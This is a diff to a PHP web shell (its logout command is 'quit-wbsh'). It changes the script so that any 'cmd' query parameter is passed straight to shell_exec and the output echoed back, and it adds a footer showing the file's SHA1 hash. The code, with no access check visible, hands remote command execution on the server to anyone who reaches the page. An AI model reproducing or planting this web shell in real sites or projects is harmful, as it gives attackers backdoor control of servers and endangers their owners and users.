@@ -1,16 +1,15 @@
-    session_start();
-    $cmd = $_GET['cmd'];
-    if (isset($_GET['execute']) && !empty($cmd))
-    {
-        echo shell_exec($cmd);
-        exit;
-    }
-    if ($cmd === "logout")
-    {
+session_start();
+if (!empty($cmd = $_GET['cmd']))
+{
+   if ($cmd === "quit-wbsh")
+   {
         session_destroy();
         header("location:/");
         exit;
     }
+    echo shell_exec($cmd);
+    exit;
+}
 echo "
 <center>
     <textarea id=\"output\" readonly=\"1\" rows=\"25\" cols=\"100\">
@@ -39,5 +38,8 @@ echo "
         document.getElementById('output').innerHTML = '';
     }
 </script>
-<a href=\"" . $_SERVER['SCRIPT_NAME'] . "?cmd=logout\">Logout</a>
+<div class=\"footer\" style=\"position: fixed;width:100%;bottom: 0;left: 0;\">
+    <p>SHA1: " . sha1_file(basename($_SERVER['SCRIPT_NAME'])) . "</p>
+    <a href=\"" . $_SERVER['SCRIPT_NAME'] . "?cmd=quit-wbsh\">Logout</a>
+</div>
 ";
